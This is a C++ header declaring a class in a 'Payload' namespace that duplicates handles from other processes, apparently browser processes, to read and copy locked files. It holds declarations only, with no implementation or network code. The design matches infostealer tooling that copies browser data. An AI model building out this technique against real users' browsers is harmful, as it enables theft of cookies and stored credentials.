

#pragma once

#include "../core/common.hpp"
#include "../sys/internal_api.hpp"
#include <string>
#include <vector>
#include <optional>
#include <functional>
#include <set>
#include <map>

namespace Payload {

    class HandleDuplicator {
    public:
        struct DuplicatedHandle {
            Core::UniqueHandle handle;
            DWORD sourcePid;
            ULONG_PTR originalHandle;
            std::wstring objectName;
        };

        using LogCallback = std::function<void(const std::string&)>;

        explicit HandleDuplicator(LogCallback logger = nullptr);
        ~HandleDuplicator() = default;

        HandleDuplicator(const HandleDuplicator&) = delete;
        HandleDuplicator& operator=(const HandleDuplicator&) = delete;
        HandleDuplicator(HandleDuplicator&&) = default;
        HandleDuplicator& operator=(HandleDuplicator&&) = default;

        [[nodiscard]] std::vector<DuplicatedHandle> DuplicateFileHandles(
            const std::filesystem::path& targetPath);

        [[nodiscard]] std::optional<std::vector<uint8_t>> ReadFileViaHandle(HANDLE hFile);

        [[nodiscard]] std::optional<std::filesystem::path> CopyLockedFile(
            const std::filesystem::path& sourcePath,
            const std::filesystem::path& destDir);

        [[nodiscard]] static bool IsFileAccessible(const std::filesystem::path& path);

    private:
        LogCallback m_logger;

        void Log(const std::string& msg);
        [[nodiscard]] std::optional<std::wstring> GetObjectName(HANDLE hObject);
        [[nodiscard]] std::wstring DosPathToNtPath(const std::filesystem::path& dosPath);
        [[nodiscard]] Core::UniqueHandle OpenProcessForDuplication(DWORD pid);
        [[nodiscard]] std::optional<LONGLONG> GetFileSizeViaHandle(HANDLE hFile);
        [[nodiscard]] std::vector<DWORD> GetBrowserProcessPids();
    };

}